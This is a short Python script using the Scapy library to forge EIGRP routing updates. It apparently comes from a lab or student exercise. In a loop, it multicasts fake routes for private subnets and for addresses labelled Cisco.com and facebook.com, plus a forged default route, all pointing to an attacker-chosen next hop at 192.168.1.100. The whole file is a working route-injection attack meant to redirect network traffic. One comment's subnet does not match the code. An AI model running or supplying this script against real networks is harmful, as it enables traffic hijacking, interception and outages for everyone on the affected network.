#import scapy
from scapy.all import *

#import modulo Eigr
load_contrib("eigrp")

#for loop to send mulpiple PacketList
for i in range(0,100):
    
    #inject fake route 192.168.1.0
    sendp(Ether()/IP(src="192.168.1.100", dst="224.0.0.10")/EIGRP(opcode="Update", asn=100, seq=1, ack=0, tlvlist=[EIGRPIntRoute(dst="192.168.100.0", nexthop="192.168.1.100")]))
    
    #Inject fake route 192.68.191.0
    sendp(Ether()/IP(src="192.168.1.100", dst="224.0.0.10")/EIGRP(opcode="Update", asn=100, seq=1, ack=0, tlvlist=[EIGRPIntRoute(dst="192.168.101.0", nexthop="192.168.1.100")]))
    
    #Inject fake route Cisco.com
    sendp(Ether()/IP(src="192.168.1.100", dst="224.0.0.10")/EIGRP(opcode="Update", asn=100, seq=1, ack=0, tlvlist=[EIGRPIntRoute(dst="74.163.4.0", nexthop="192.168.1.100")]))
    
    #Inject fake route facebook.com
    sendp(Ether()/IP(src="192.168.1.100", dst="224.0.0.10")/EIGRP(opcode="Update", asn=100, seq=1, ack=0, tlvlist=[EIGRPIntRoute(dst="157.240.22.35", nexthop="192.168.1.100")]))
    
    #change route default
    sendp(Ether()/IP(src="192.168.1.100", dst="224.0.0.10")/EIGRP(opcode="Update", asn=100, seq=1, ack=0, tlvlist=[EIGRPIntRoute(dst="0.0.0.0", nexthop="192.168.1.100", originrouter="192.168.1.100",  prefixlen=0, flags="candidate-default")]))
    
    time.sleep(2)